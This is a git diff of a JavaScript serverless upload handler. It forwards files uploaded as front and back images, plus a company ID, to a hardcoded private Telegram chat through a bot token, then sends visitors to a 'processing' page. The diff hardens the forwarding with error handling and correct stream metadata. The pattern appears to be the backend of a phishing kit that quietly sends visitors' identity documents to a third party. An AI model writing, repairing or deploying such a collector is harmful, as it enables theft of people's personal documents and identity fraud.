@@ -1,43 +1,65 @@
 import formidable from 'formidable';
 import axios from 'axios';
+import FormData from 'form-data'; // Use the imported 'form-data' package
+import * as fs from 'fs';       // Use standard file system module
+
+// NOTE: Set your Telegram Bot Token as a Vercel Environment Variable 
+// (Settings -> Environment Variables) named 'TELEGRAM_BOT_TOKEN'
+// This keeps your secret token out of the public code.
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
+const CHAT_ID = '8483934112'; // Your fixed chat ID
 
 // IMPORTANT: Vercel serverless functions need the exports.default format
 export default async function handler(req, res) {
-    // 1. Ensure the request is POST
     if (req.method !== 'POST') {
         return res.status(405).send('Method Not Allowed');
     }
-
-    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Use environment variables!
-    const CHAT_ID = '8483934112'; // Your chat ID
-
-    // 2. Parse the multipart form data (files + text)
-    const form = formidable({});
-
-    const [fields, files] = await form.parse(req);
     
-    // Convert fields from array to string
-    const companyId = fields.companyId ? fields.companyId[0] : '';
+    // Check if token is available
+    if (!BOT_TOKEN) {
+        console.error("TELEGRAM_BOT_TOKEN environment variable is not set!");
+        return res.status(500).send('Configuration Error');
+    }
 
-    // Get the file objects
+    const form = formidable({});
+    
+    let fields;
+    let files;
+    
+    try {
+        // Parse the multipart form data
+        [fields, files] = await form.parse(req);
+    } catch (err) {
+        console.error('Formidable Parse Error:', err);
+        return res.status(500).send('File Upload Processing Failed');
+    }
+
+    // Convert fields from array (formidable behavior) to string
+    const companyId = fields.companyId ? fields.companyId[0] : '';
     const frontFile = files.frontUpload ? files.frontUpload[0] : null;
     const backFile = files.backUpload ? files.backUpload[0] : null;
 
     // --- Helper function to send files ---
     async function sendDocument(chatId, file) {
-        if (!file) return;
+        if (!file || file.size === 0) return;
 
         const formData = new FormData();
         formData.append('chat_id', chatId);
         
-        // Append the file stream
-        const fileStream = require('fs').createReadStream(file.filepath);
-        formData.append('document', fileStream, file.originalFilename);
+        // Use fs.createReadStream for large file handling
+        const fileStream = fs.createReadStream(file.filepath);
+        
+        // Append the file stream with correct metadata
+        formData.append('document', fileStream, {
+            filename: file.originalFilename,
+            contentType: file.mimetype,
+        });
 
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
         
         try {
             await axios.post(url, formData, {
+                // IMPORTANT: Use getHeaders() from form-data for correct boundary
                 headers: formData.getHeaders(),
             });
         } catch (error) {
@@ -72,9 +94,7 @@ export default async function handler(req, res) {
     // Send final confirmation
     await sendMessage(CHAT_ID, "✅ All files and data received successfully.");
 
-
     // 4. Redirect the user
-    // The serverless function must send a 302 redirect header
     res.setHeader('Location', '/processing.html');
     res.status(302).end();
 }
